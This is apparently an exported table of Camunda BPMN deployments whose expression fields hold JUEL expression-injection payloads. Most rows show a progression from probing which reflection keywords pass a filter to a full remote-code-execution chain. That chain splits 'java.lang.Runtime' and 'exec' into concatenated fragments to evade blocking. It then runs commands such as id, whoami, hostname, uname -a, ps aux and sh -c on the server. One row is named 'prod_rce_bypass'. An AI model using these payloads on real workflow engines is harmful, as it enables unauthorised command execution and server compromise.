deployment_id,deployment_name,deploy_time,resource,attribute,value
2319db55-5652-11f1-83ae-f28d8745614f,test2,2026-05-23 02:50:20.140000,el.bpmn,camunda:expression,${'hello'.concat(' world')}
2319db55-5652-11f1-83ae-f28d8745614f,test2,2026-05-23 02:50:20.140000,el.bpmn,camunda:resultVariable,o
236626cd-5652-11f1-83ae-f28d8745614f,test3,2026-05-23 02:50:20.640000,gc.bpmn,camunda:expression,${''.getClass().getName()}
236626cd-5652-11f1-83ae-f28d8745614f,test3,2026-05-23 02:50:20.640000,gc.bpmn,camunda:resultVariable,o
238dd250-5652-11f1-83ae-f28d8745614f,test5,2026-05-23 02:50:20.900000,ob.bpmn,camunda:expression,${''.getClass().forName('java.lang'.concat('.Run').concat('time')).getName()}
238dd250-5652-11f1-83ae-f28d8745614f,test5,2026-05-23 02:50:20.900000,ob.bpmn,camunda:resultVariable,o
23ae0483-5652-11f1-83ae-f28d8745614f,kw_getClass,2026-05-23 02:50:21.111000,getClass.bpmn,camunda:expression,${'getClass'}
23ae0483-5652-11f1-83ae-f28d8745614f,kw_getClass,2026-05-23 02:50:21.111000,getClass.bpmn,camunda:resultVariable,o
240ee94a-5652-11f1-83ae-f28d8745614f,kw_forName,2026-05-23 02:50:21.746000,forName.bpmn,camunda:expression,${'forName'}
240ee94a-5652-11f1-83ae-f28d8745614f,kw_forName,2026-05-23 02:50:21.746000,forName.bpmn,camunda:resultVariable,o
24230d97-5652-11f1-83ae-f28d8745614f,kw_getMethod,2026-05-23 02:50:21.878000,getMethod.bpmn,camunda:expression,${'getMethod'}
24230d97-5652-11f1-83ae-f28d8745614f,kw_getMethod,2026-05-23 02:50:21.878000,getMethod.bpmn,camunda:resultVariable,o
243efa0a-5652-11f1-83ae-f28d8745614f,kw_invoke,2026-05-23 02:50:22.061000,invoke.bpmn,camunda:expression,${'invoke'}
243efa0a-5652-11f1-83ae-f28d8745614f,kw_invoke,2026-05-23 02:50:22.061000,invoke.bpmn,camunda:resultVariable,o
24520cdd-5652-11f1-83ae-f28d8745614f,kw_getConstructor,2026-05-23 02:50:22.186000,getConstructor.bpmn,camunda:expression,${'getConstructor'}
24520cdd-5652-11f1-83ae-f28d8745614f,kw_getConstructor,2026-05-23 02:50:22.186000,getConstructor.bpmn,camunda:resultVariable,o
246e6e8b-5652-11f1-83ae-f28d8745614f,kw_newInstance,2026-05-23 02:50:22.372000,newInstance.bpmn,camunda:expression,${'newInstance'}
246e6e8b-5652-11f1-83ae-f28d8745614f,kw_newInstance,2026-05-23 02:50:22.372000,newInstance.bpmn,camunda:resultVariable,o
24ab025f-5652-11f1-83ae-f28d8745614f,kw_getInputStream,2026-05-23 02:50:22.769000,getInputStream.bpmn,camunda:expression,${'getInputStream'}
24ab025f-5652-11f1-83ae-f28d8745614f,kw_getInputStream,2026-05-23 02:50:22.769000,getInputStream.bpmn,camunda:resultVariable,o
258cd721-5652-11f1-83ae-f28d8745614f,kw_readAllBytes,2026-05-23 02:50:24.249000,readAllBytes.bpmn,camunda:expression,${'readAllBytes'}
258cd721-5652-11f1-83ae-f28d8745614f,kw_readAllBytes,2026-05-23 02:50:24.249000,readAllBytes.bpmn,camunda:resultVariable,o
25ff4827-5652-11f1-83ae-f28d8745614f,kw_concat,2026-05-23 02:50:24.999000,concat.bpmn,camunda:expression,${'concat'}
25ff4827-5652-11f1-83ae-f28d8745614f,kw_concat,2026-05-23 02:50:24.999000,concat.bpmn,camunda:resultVariable,o
264f6411-5652-11f1-83ae-f28d8745614f,kw_getRuntime,2026-05-23 02:50:25.524000,getRuntime.bpmn,camunda:expression,${'getRuntime'}
264f6411-5652-11f1-83ae-f28d8745614f,kw_getRuntime,2026-05-23 02:50:25.524000,getRuntime.bpmn,camunda:resultVariable,o
2701754c-5652-11f1-83ae-f28d8745614f,kw_[B,2026-05-23 02:50:26.691000,[B.bpmn,camunda:expression,${'[B'}
2701754c-5652-11f1-83ae-f28d8745614f,kw_[B,2026-05-23 02:50:26.691000,[B.bpmn,camunda:resultVariable,o
27734a3d-5652-11f1-83ae-f28d8745614f,cb,2026-05-23 02:50:27.437000,cb.bpmn,camunda:expression,${'getClass().forName'}
27734a3d-5652-11f1-83ae-f28d8745614f,cb,2026-05-23 02:50:27.437000,cb.bpmn,camunda:resultVariable,o
27a83d09-5652-11f1-83ae-f28d8745614f,cb,2026-05-23 02:50:27.784000,cb.bpmn,camunda:expression,${'getClass().getMethod'}
27a83d09-5652-11f1-83ae-f28d8745614f,cb,2026-05-23 02:50:27.784000,cb.bpmn,camunda:resultVariable,o
27e916ac-5652-11f1-83ae-f28d8745614f,cb,2026-05-23 02:50:28.209000,cb.bpmn,camunda:expression,${'forName().getMethod'}
27e916ac-5652-11f1-83ae-f28d8745614f,cb,2026-05-23 02:50:28.209000,cb.bpmn,camunda:resultVariable,o
281cd0f2-5652-11f1-83ae-f28d8745614f,cb,2026-05-23 02:50:28.548000,cb.bpmn,camunda:expression,${'getMethod().invoke'}
281cd0f2-5652-11f1-83ae-f28d8745614f,cb,2026-05-23 02:50:28.548000,cb.bpmn,camunda:resultVariable,o
490690b2-5652-11f1-83ae-f28d8745614f,A_getClass,2026-05-23 02:51:23.767000,A_getClass.bpmn,camunda:expression,${''.getClass()}
490690b2-5652-11f1-83ae-f28d8745614f,A_getClass,2026-05-23 02:51:23.767000,A_getClass.bpmn,camunda:resultVariable,o
493011cf-5652-11f1-83ae-f28d8745614f,B_getClass_forName_B,2026-05-23 02:51:24.039000,B_getClass_forName_B.bpmn,camunda:expression,${''.getClass().forName('[B')}
493011cf-5652-11f1-83ae-f28d8745614f,B_getClass_forName_B,2026-05-23 02:51:24.039000,B_getClass_forName_B.bpmn,camunda:resultVariable,o
495a080b-5652-11f1-83ae-f28d8745614f,C_getConstructor,2026-05-23 02:51:24.314000,C_getConstructor.bpmn,camunda:expression,${''.getClass().getConstructor(''.getClass().forName('[B'))}
495a080b-5652-11f1-83ae-f28d8745614f,C_getConstructor,2026-05-23 02:51:24.314000,C_getConstructor.bpmn,camunda:resultVariable,o
498c89d3-5652-11f1-83ae-f28d8745614f,D_newInstance,2026-05-23 02:51:24.645000,D_newInstance.bpmn,camunda:expression,${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(null)}
498c89d3-5652-11f1-83ae-f28d8745614f,D_newInstance,2026-05-23 02:51:24.645000,D_newInstance.bpmn,camunda:resultVariable,o
49acbc06-5652-11f1-83ae-f28d8745614f,E_forName_obfusc,2026-05-23 02:51:24.856000,E_forName_obfusc.bpmn,camunda:expression,${''.getClass().forName('java.lang'.concat('.Run').concat('time'))}
49acbc06-5652-11f1-83ae-f28d8745614f,E_forName_obfusc,2026-05-23 02:51:24.856000,E_forName_obfusc.bpmn,camunda:resultVariable,o
b417789c-5652-11f1-b844-2660c280cffd,fn_getName,2026-05-23 02:54:23.394000,fn_getName.bpmn,camunda:expression,${''.getClass().forName('java.lang'.concat('.Str').concat('ing')).getName()}
b417789c-5652-11f1-b844-2660c280cffd,fn_getName,2026-05-23 02:54:23.394000,fn_getName.bpmn,camunda:resultVariable,o
b4405d75-5652-11f1-b844-2660c280cffd,fn_getSimpleName,2026-05-23 02:54:23.662000,fn_getSimpleName.bpmn,camunda:expression,${''.getClass().forName('java.lang'.concat('.Str').concat('ing')).getSimpleName()}
b4405d75-5652-11f1-b844-2660c280cffd,fn_getSimpleName,2026-05-23 02:54:23.662000,fn_getSimpleName.bpmn,camunda:resultVariable,o
b45c22d8-5652-11f1-b844-2660c280cffd,fn_toString,2026-05-23 02:54:23.844000,fn_toString.bpmn,camunda:expression,${''.getClass().forName('java.lang'.concat('.Str').concat('ing')).toString()}
b45c22d8-5652-11f1-b844-2660c280cffd,fn_toString,2026-05-23 02:54:23.844000,fn_toString.bpmn,camunda:resultVariable,o
b472df30-5652-11f1-b844-2660c280cffd,fn_getMethods,2026-05-23 02:54:23.993000,fn_getMethods.bpmn,camunda:expression,${''.getClass().forName('java.lang'.concat('.Str').concat('ing')).getMethods()}
b472df30-5652-11f1-b844-2660c280cffd,fn_getMethods,2026-05-23 02:54:23.993000,fn_getMethods.bpmn,camunda:resultVariable,o
b48b7043-5652-11f1-b844-2660c280cffd,fn_getMethod,2026-05-23 02:54:24.154000,fn_getMethod.bpmn,camunda:expression,${''.getClass().forName('java.lang'.concat('.Str').concat('ing')).getMethod('toString')}
b48b7043-5652-11f1-b844-2660c280cffd,fn_getMethod,2026-05-23 02:54:24.154000,fn_getMethod.bpmn,camunda:resultVariable,o
b4a44f76-5652-11f1-b844-2660c280cffd,fn_getConstructor,2026-05-23 02:54:24.317000,fn_getConstructor.bpmn,camunda:expression,${''.getClass().forName('java.lang'.concat('.Str').concat('ing')).getConstructor(''.getClass().forName('[B'))}
b4a44f76-5652-11f1-b844-2660c280cffd,fn_getConstructor,2026-05-23 02:54:24.317000,fn_getConstructor.bpmn,camunda:resultVariable,o
b4b9ac39-5652-11f1-b844-2660c280cffd,fn_newInstance,2026-05-23 02:54:24.457000,fn_newInstance.bpmn,camunda:expression,${''.getClass().forName('java.lang'.concat('.Str').concat('ing')).newInstance()}
b4b9ac39-5652-11f1-b844-2660c280cffd,fn_newInstance,2026-05-23 02:54:24.457000,fn_newInstance.bpmn,camunda:resultVariable,o
b4d4391c-5652-11f1-b844-2660c280cffd,fn_cast,2026-05-23 02:54:24.631000,fn_cast.bpmn,camunda:expression,${''.getClass().forName('java.lang'.concat('.Str').concat('ing')).cast('hello')}
b4d4391c-5652-11f1-b844-2660c280cffd,fn_cast,2026-05-23 02:54:24.631000,fn_cast.bpmn,camunda:resultVariable,o
b4f862ef-5652-11f1-b844-2660c280cffd,concat_class_ref,2026-05-23 02:54:24.868000,concat_class_ref.bpmn,camunda:expression,${(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime'))).getMethod('get'.concat('Runtime'))}
b4f862ef-5652-11f1-b844-2660c280cffd,concat_class_ref,2026-05-23 02:54:24.868000,concat_class_ref.bpmn,camunda:resultVariable,o
b50d2372-5652-11f1-b844-2660c280cffd,split_v2,2026-05-23 02:54:25.004000,split_v2.bpmn,camunda:expression,${''.getClass().forName('ja'.concat('va.la').concat('ng.Ru').concat('ntime')).getMethod('ge'.concat('tRunt').concat('ime'))}
b50d2372-5652-11f1-b844-2660c280cffd,split_v2,2026-05-23 02:54:25.004000,split_v2.bpmn,camunda:resultVariable,o
b52ae4a5-5652-11f1-b844-2660c280cffd,meta_forName,2026-05-23 02:54:25.199000,meta_forName.bpmn,camunda:expression,"${''.getClass().getClass().getMethod('forName', ''.getClass()).invoke(null, 'java.lang'.concat('.Run').concat('time'))}"
b52ae4a5-5652-11f1-b844-2660c280cffd,meta_forName,2026-05-23 02:54:25.199000,meta_forName.bpmn,camunda:resultVariable,o
b5406878-5652-11f1-b844-2660c280cffd,getclass_getmethod,2026-05-23 02:54:25.340000,getclass_getmethod.bpmn,camunda:expression,${''.getClass().getMethod('toString')}
b5406878-5652-11f1-b844-2660c280cffd,getclass_getmethod,2026-05-23 02:54:25.340000,getclass_getmethod.bpmn,camunda:resultVariable,o
d37e691d-5652-11f1-b844-2660c280cffd,prod_rce_bypass,2026-05-23 02:55:16.078000,prod_rce_bypass.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'hostname').getInputStream().readAllBytes())}"
d37e691d-5652-11f1-b844-2660c280cffd,prod_rce_bypass,2026-05-23 02:55:16.078000,prod_rce_bypass.bpmn,camunda:resultVariable,o
0b9064d3-5654-11f1-b844-2660c280cffd,x1_1779505439,2026-05-23 03:03:59.645000,x1_1779505439.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'hostname').getInputStream().readAllBytes())}"
0b9064d3-5654-11f1-b844-2660c280cffd,x1_1779505439,2026-05-23 03:03:59.645000,x1_1779505439.bpmn,camunda:resultVariable,o
4a2b76f7-5654-11f1-b844-2660c280cffd,cmd_hostname,2026-05-23 03:05:44.679000,cmd_hostname.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'hostname').getInputStream().readAllBytes())}"
4a2b76f7-5654-11f1-b844-2660c280cffd,cmd_hostname,2026-05-23 03:05:44.679000,cmd_hostname.bpmn,camunda:resultVariable,o
4a508b31-5654-11f1-b844-2660c280cffd,cmd_id,2026-05-23 03:05:44.923000,cmd_id.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'id').getInputStream().readAllBytes())}"
4a508b31-5654-11f1-b844-2660c280cffd,cmd_id,2026-05-23 03:05:44.923000,cmd_id.bpmn,camunda:resultVariable,o
4a66f964-5654-11f1-b844-2660c280cffd,cmd_uname,2026-05-23 03:05:45.070000,cmd_uname.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'uname').getInputStream().readAllBytes())}"
4a66f964-5654-11f1-b844-2660c280cffd,cmd_uname,2026-05-23 03:05:45.070000,cmd_uname.bpmn,camunda:resultVariable,o
4a7bb9fb-5654-11f1-b844-2660c280cffd,cmd_sh_c,2026-05-23 03:05:45.206000,cmd_sh_c.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'sh -c uname').getInputStream().readAllBytes())}"
4a7bb9fb-5654-11f1-b844-2660c280cffd,cmd_sh_c,2026-05-23 03:05:45.206000,cmd_sh_c.bpmn,camunda:resultVariable,o
4a902c5e-5654-11f1-b844-2660c280cffd,cmd_sh_only,2026-05-23 03:05:45.340000,cmd_sh_only.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'sh').getInputStream().readAllBytes())}"
4a902c5e-5654-11f1-b844-2660c280cffd,cmd_sh_only,2026-05-23 03:05:45.340000,cmd_sh_only.bpmn,camunda:resultVariable,o
4abe4141-5654-11f1-b844-2660c280cffd,cmd_dollar_brace,2026-05-23 03:05:45.642000,cmd_dollar_brace.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'test${x}test').getInputStream().readAllBytes())}"
4abe4141-5654-11f1-b844-2660c280cffd,cmd_dollar_brace,2026-05-23 03:05:45.642000,cmd_dollar_brace.bpmn,camunda:resultVariable,o
4ad2dab4-5654-11f1-b844-2660c280cffd,cmd_dash_a,2026-05-23 03:05:45.777000,cmd_dash_a.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'uname -a').getInputStream().readAllBytes())}"
4ad2dab4-5654-11f1-b844-2660c280cffd,cmd_dash_a,2026-05-23 03:05:45.777000,cmd_dash_a.bpmn,camunda:resultVariable,o
4ff69e3a-5654-11f1-b844-2660c280cffd,x1_1779505554,2026-05-23 03:05:54.400000,x1_1779505554.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'hostname').getInputStream().readAllBytes())}"
4ff69e3a-5654-11f1-b844-2660c280cffd,x1_1779505554,2026-05-23 03:05:54.400000,x1_1779505554.bpmn,camunda:resultVariable,o
6e1a396a-5654-11f1-b844-2660c280cffd,ifs_tab,2026-05-23 03:06:44.965000,ifs_tab.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'sh	-c	uname	-a').getInputStream().readAllBytes())}"
6e1a396a-5654-11f1-b844-2660c280cffd,ifs_tab,2026-05-23 03:06:44.965000,ifs_tab.bpmn,camunda:resultVariable,o
708fcdf5-5654-11f1-b844-2660c280cffd,direct_uname,2026-05-23 03:06:49.090000,direct_uname.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'uname -a').getInputStream().readAllBytes())}"
708fcdf5-5654-11f1-b844-2660c280cffd,direct_uname,2026-05-23 03:06:49.090000,direct_uname.bpmn,camunda:resultVariable,o
72ea10fa-5654-11f1-b844-2660c280cffd,direct_cat,2026-05-23 03:06:53.038000,direct_cat.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'cat /etc/hostname').getInputStream().readAllBytes())}"
72ea10fa-5654-11f1-b844-2660c280cffd,direct_cat,2026-05-23 03:06:53.038000,direct_cat.bpmn,camunda:resultVariable,o
7540ab96-5654-11f1-b844-2660c280cffd,direct_ls,2026-05-23 03:06:56.961000,direct_ls.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'ls -la').getInputStream().readAllBytes())}"
7540ab96-5654-11f1-b844-2660c280cffd,direct_ls,2026-05-23 03:06:56.961000,direct_ls.bpmn,camunda:resultVariable,o
779b6429-5654-11f1-b844-2660c280cffd,direct_ps,2026-05-23 03:07:00.911000,direct_ps.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'ps aux').getInputStream().readAllBytes())}"
779b6429-5654-11f1-b844-2660c280cffd,direct_ps,2026-05-23 03:07:00.911000,direct_ps.bpmn,camunda:resultVariable,o
7b97717f-5654-11f1-b844-2660c280cffd,x1_1779505627,2026-05-23 03:07:07.596000,x1_1779505627.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'id').getInputStream().readAllBytes())}"
7b97717f-5654-11f1-b844-2660c280cffd,x1_1779505627,2026-05-23 03:07:07.596000,x1_1779505627.bpmn,camunda:resultVariable,o
b61f6e55-5810-11f1-91eb-8234d71ec138,x1_1779696421,2026-05-25 08:07:02.343000,x1_1779696421.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'hostname').getInputStream().readAllBytes())}"
b61f6e55-5810-11f1-91eb-8234d71ec138,x1_1779696421,2026-05-25 08:07:02.343000,x1_1779696421.bpmn,camunda:resultVariable,o
c37a775a-5810-11f1-91eb-8234d71ec138,x1_1779696444,2026-05-25 08:07:24.750000,x1_1779696444.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'hostname').getInputStream().readAllBytes())}"
c37a775a-5810-11f1-91eb-8234d71ec138,x1_1779696444,2026-05-25 08:07:24.750000,x1_1779696444.bpmn,camunda:resultVariable,o
6d6a8b8c-64c5-11f1-b6ed-5a14742b6da0,x1_1781093452,2026-06-10 12:10:53.223000,x1_1781093452.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'id').getInputStream().readAllBytes())}"
6d6a8b8c-64c5-11f1-b6ed-5a14742b6da0,x1_1781093452,2026-06-10 12:10:53.223000,x1_1781093452.bpmn,camunda:resultVariable,o
7e13fcaf-64c5-11f1-b6ed-5a14742b6da0,x1_1781093480,2026-06-10 12:11:21.176000,x1_1781093480.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'whoami').getInputStream().readAllBytes())}"
7e13fcaf-64c5-11f1-b6ed-5a14742b6da0,x1_1781093480,2026-06-10 12:11:21.176000,x1_1781093480.bpmn,camunda:resultVariable,o
95affe94-64c5-11f1-b6ed-5a14742b6da0,x1_1781093520,2026-06-10 12:12:00.787000,x1_1781093520.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'id').getInputStream().readAllBytes())}"
95affe94-64c5-11f1-b6ed-5a14742b6da0,x1_1781093520,2026-06-10 12:12:00.787000,x1_1781093520.bpmn,camunda:resultVariable,o
d143eaec-64c5-11f1-b6ed-5a14742b6da0,x1_1781093620,2026-06-10 12:13:40.742000,x1_1781093620.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'id').getInputStream().readAllBytes())}"
d143eaec-64c5-11f1-b6ed-5a14742b6da0,x1_1781093620,2026-06-10 12:13:40.742000,x1_1781093620.bpmn,camunda:resultVariable,o
d939e130-64c5-11f1-b6ed-5a14742b6da0,x1_1781093633,2026-06-10 12:13:54.098000,x1_1781093633.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'hostname').getInputStream().readAllBytes())}"
d939e130-64c5-11f1-b6ed-5a14742b6da0,x1_1781093633,2026-06-10 12:13:54.098000,x1_1781093633.bpmn,camunda:resultVariable,o
65deef10-6564-11f1-b090-8a5f6f8381cf,x1_1781161729,2026-06-11 07:08:50.544000,x1_1781161729.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'hostname').getInputStream().readAllBytes())}"
65deef10-6564-11f1-b090-8a5f6f8381cf,x1_1781161729,2026-06-11 07:08:50.544000,x1_1781161729.bpmn,camunda:resultVariable,o
bb04b923-7484-11f1-b24d-46c802fe1cdc,x1_1782824884,2026-06-30 13:08:04.735000,x1_1782824884.bpmn,camunda:expression,"${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'id').getInputStream().readAllBytes())}"
bb04b923-7484-11f1-b24d-46c802fe1cdc,x1_1782824884,2026-06-30 13:08:04.735000,x1_1782824884.bpmn,camunda:resultVariable,o
